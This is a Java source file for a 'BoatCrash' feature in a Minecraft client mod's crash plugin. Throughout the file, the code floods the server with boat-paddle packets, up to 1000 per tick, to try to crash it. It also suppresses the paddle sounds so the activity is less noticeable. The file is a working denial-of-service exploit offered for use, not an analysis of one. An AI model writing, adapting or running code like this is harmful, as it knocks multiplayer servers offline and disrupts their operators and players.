package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.crash.event.EventPlaySound;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.ServerPacketFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.packet.EventPacketReceive;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;

public class BoatCrash extends Feature {

    @Op(name = "Packet Count", min = 1, max = 1000, inc = 5)
    public int packetCount = 100;
    @Op(name = "No Sound")
    public boolean noSound = true;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    private final BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);

    public BoatCrash() {
        super(CrashPlugin.CRASH, "Tries to crash the server when you are in a boat. (By 0x150)");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        Entity entity = Wrapper.INSTANCE.getPlayer().getVehicle();
        if (!(entity instanceof BoatEntity)) {
            ChatHelper.INSTANCE.addClientMessage("ERROR! You must be in a boat for this!");
            setState(false);
            return;
        }
        for (int i = 0; i < packetCount; i++) {
            NetworkHelper.INSTANCE.sendPacket(PACKET);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    @EventPointer
    private final EventListener<EventPlaySound> eventPacketReceiveEventListener = new EventListener<>(eventPlaySound -> {
        if (!noSound)
            return;
        String sound = eventPlaySound.getIdentifier().toString();
        if (sound.equalsIgnoreCase("minecraft:entity.boat.paddle_land") || sound.equalsIgnoreCase("minecraft:entity.boat.paddle_water"))
            eventPlaySound.cancel();
    });
}
